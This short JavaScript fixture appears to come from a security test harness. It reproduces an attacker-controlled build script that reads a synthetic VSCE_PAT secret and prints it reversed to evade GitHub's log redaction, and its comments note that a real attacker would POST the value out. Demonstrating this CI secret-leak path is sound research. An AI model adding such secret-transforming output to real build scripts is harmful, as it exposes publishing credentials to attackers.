// The same build script, on the attacker's ref. The workflow file above it is byte-identical to main.
// The fixture's VSCE_PAT is a synthetic string bin/run.sh generates. No real credential exists here.
//
// It prints the value reversed. GitHub redacts a secret's literal bytes from job logs, and that is
// a log-scrubbing convenience rather than a boundary: the code holding the value is the attacker's,
// so any transform defeats it. Reversing keeps the fixture self-contained; a real attacker would
// POST it somewhere. bin/verify.sh reverses it back and compares against the value run.sh set.
const pat = process.env.VSCE_PAT || "(absent)";
console.log("packaging the extension");
console.log("ATTACKER_HELD_VSCE_PAT_LENGTH=" + pat.length);
console.log("ATTACKER_HELD_VSCE_PAT_REVERSED=" + [...pat].reverse().join(""));
